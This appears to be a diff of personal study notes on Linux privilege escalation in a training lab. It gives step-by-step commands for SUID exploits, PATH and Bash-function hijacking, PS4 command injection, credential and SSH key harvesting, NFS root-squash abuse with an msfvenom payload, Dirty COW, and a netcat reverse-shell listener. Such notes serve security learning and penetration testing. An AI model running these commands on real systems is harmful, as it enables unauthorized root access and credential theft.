@@ -1,5 +1,5 @@
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
-Weak File Permissions - Readable /etc/shadow
+Weak File Permissions - Readable /etc/shadow                        /home/user/tools/ <-- Found on ExploitDB github
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
 The /etc/shadow file contains user password hashes and is usually readable only by the root user.
 
@@ -194,7 +194,201 @@ Set up a netcat listener on your Attacking PC on port 4444 and wait for the cron
         nc -nvlp 4444
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
+SUID / SGID Executables - Known Exploits !!!
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Find all the SUID/SGID executables on the device:
+
+        find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+
+Find a known exploit for applications with version #'s. Exploit-DB, Google, GitHub good places to Look. (Ex.. /usr/sbin/exim-4.84-3) 
+
+A local privilege escalation exploit matching this version of exim exactly should be available. Dowload this to the machine /tmp/suid/exim/cve-2016-1531.sh
+
+Run the exploit script to gain a root shell:
+
+        /tmp/suid/exim/cve-2016-1531.sh
+        
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
+SUID / SGID Executables - Shared Object Injection
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
+The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.
+
+First, execute the file and note that currently it displays a progress bar before exiting:
+
+        /usr/local/bin/suid-so
+
+Run strace on the file and search the output for open/access calls and for "no such file" errors:
+
+        strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+
+Note that the executable tries to load the "/home/user/.config/libcalc.so" shared object within our home directory, but it cannot be found.
+
+C reate the .config directory for the libcalc.so file:
+
+        mkdir /home/user/.config
+
+Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the 
+location the suid-so executable was looking for it:
+
+        gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+
+Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.
+
+        /usr/local/bin/suid-so
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
+SUID / SGID Executables - Environment Variables
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without
+specifying an absolute path.
+
+First, execute the file and note ehat it runs/ or tries to run (Ex.. trying to start the apache2 webserver)
+
+        /usr/local/bin/suid-env
+
+Run strings on the file to look for strings of printable characters:
+
+        strings /usr/local/bin/suid-env
+
+One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable 
+(/usr/sbin/service) is not being used!!!
+
+Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:
+
+        gcc -o service /home/user/tools/suid/service.c
+
+Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
+
+        PATH=.:$PATH /usr/local/bin/suid-env
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+SUID / SGID Executables - Abusing Shell Feature on Bash versions < 4.2-048
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable 
+(/usr/sbin/service) to start the apache2 webserver.
+Verify this with strings:
+
+        strings /usr/local/bin/suid-env2
+
+In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used 
+instead of any actual executable at that file path.
+
+Verify the version of Bash installed on the Debian VM is less than 4.2-048:
+
+        /bin/bash --version
+
+Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
+
+        function /usr/sbin/service { /bin/bash -p; }
+        export -f /usr/sbin/service
+
+Run the suid-env2 executable to gain a root shell:
+
+        /usr/local/bin/suid-env2
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+ SUID / SGID Executables - Abusing Shell Features on Bash versions 4.4 and above
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
+
+Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version
+of /bin/bash:
+
+        env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+
+Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+
+        /tmp/rootbash -p
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Passwords & Keys - History Files
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
+View the contents of all the hidden history files in the user's home directory:
+
+        cat ~/.*history | less
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Passwords & Keys - Config Files  (Example..openvpn)
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Config files often contain passwords in plaintext or other reversible formats.
+List the contents of the user's home directory:
+
+    l   s /home/user
+
+Note the presence of a myvpn.ovpn config file. View the contents of the file:
+
+        cat /home/user/myvpn.ovpn
+
+The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Passwords & Keys - SSH Keys
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Sometimes users make backups of important files but fail to secure them with the correct permissions.
+Look for hidden files & directories in the system root:
+
+        ls -la /
+
+NOTE: that there appears to be a hidden directory called .ssh. View the contents of the directory:
+
+        ls -l /.ssh
+
+Note that there is a world-readable file called root_key. Further inspection of this file should indicate it is a private SSH key. The name of the file
+suggests it is for the root user.
+
+Copy the key over  (it's easier to just view the contents of the root_key file and copy/paste the key) and give it the correct permissions,
+otherwise your SSH client will refuse to use it:
+
+        chmod 600 root_key
+
+Use the key to login to the Debian VM as the root account:
+
+        ssh -i root_key root@[Remote-Comp]
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+NFS
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Files created via NFS inherit the remote user's ID. If the user is ROOT, and root squashing is enabled, the ID will instead be set to the "nobody" user.
+Check the NFS share configuration on Machine:
+
+        cat /etc/exports
+
+Note that the /tmp share has root squashing disabled.
+
+On your Attacking machine, switch to your root user if you are not already running as root:
+
+        sudo su
+
+Using Attakers' machine's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):
+
+        mkdir /tmp/nfs
+        mount -o rw,vers=2 [IP-of-Target]:/tmp /tmp/nfs
+
+Still using Attacking machines root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
+
+        msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+
+Still using Attacking machines root user, make the file executable and set the SUID permission:
+
+        chmod +xs /tmp/nfs/shell.elf
+
+Back on the TARGET machine, as the low privileged user account, execute the file to gain a root shell:
+
+        /tmp/shell.elf
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Kernel Exploits      "Linux Exploit Suggester 2" https://github.com/jondonas/linux-exploit-suggester-2
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Kernel exploits can leave the system in an unstable state, which is why you should only run them as a LAST RESORT !!!
+
+Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:
+
+        perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+
+The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. 
+It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).
+
+Compile the code and run it (note that it may take several minutes to complete):
+
+        gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+Then:
+        ./c0w
+
+Once the exploit completes, run /usr/bin/passwd to gain a root shell:
+
+        /usr/bin/passwd
